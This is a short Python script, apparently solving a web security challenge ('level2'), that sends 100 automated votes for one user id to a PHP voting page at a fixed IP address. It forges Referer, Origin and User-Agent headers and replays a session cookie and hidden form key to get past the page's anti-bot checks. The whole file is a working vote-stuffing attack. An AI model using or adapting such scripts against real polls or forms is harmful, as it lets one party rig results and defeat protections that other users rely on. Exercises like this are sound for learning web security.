#!/usr/bin/python3
import requests
from colorama import Fore

url = 'http://158.69.76.135/level2.php'
headers = {
    'Referer': 'http://158.69.76.135/level2.php',
    'Host': '158.69.76.135',
    'Origin': 'http://158.69.76.135',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36'
}
cookies = {
    'PHPSESSID': '84cgtshoc5m5mvabqrrce85f64',
    'HoldTheDoor': '9370401b15597838e32633c10b6b27a61160446a'
}
myobj = {
    'id': '28',
    'holdthedoor': 'Submit',
    'key': '9370401b15597838e32633c10b6b27a61160446a'
}

for i in range(1, 101):
    requests.post(url, data=myobj, cookies=cookies, headers=headers)
    print(Fore.YELLOW + "voting for: {}, I've done {} votes".format(myobj.get("id"), i))
print(Fore.GREEN + "I've done {} votes, by the user {}".format(i, (myobj.get("id"))))
